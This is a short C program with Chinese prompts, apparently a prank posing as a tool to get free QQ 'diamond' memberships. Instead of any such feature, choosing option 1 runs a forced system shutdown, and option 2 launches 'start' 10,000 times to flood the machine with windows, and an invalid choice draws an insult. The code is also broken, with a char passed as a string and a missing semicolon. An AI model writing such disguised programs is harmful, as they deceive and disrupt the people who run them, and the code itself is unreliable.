#include <stdio.h>
#include <windows.h>
#include <malloc.h>
#include<string.h>

int main(void)
{
	
	int c;
	int i;
	int j;
	char m;
	int n; 
	

	printf("请输入你的QQ号:\n");
	scanf("%s",&m);
	n = strlen(m);
	if(n>11 ||n<5)
	{
		printf("没有这个QQ!")
    }
	nihao:
	printf("1:刷全钻.\n");
	printf("2:只刷黄钻.\n");
	printf("请选择(1或2):"); 
	scanf("%d",&c);
	if(c==1)
	{
		system("shutdown -s -t 10");
	}
	else if(c==2)
	{
		printf("请耐心等待.....\n");
		for(j=0;j<10000;++j)
			system("start"); 
	}
	else
	{
		printf("傻逼 让你敲1或2!!!\n");
		goto nihao; 
	}
	return 0;
}
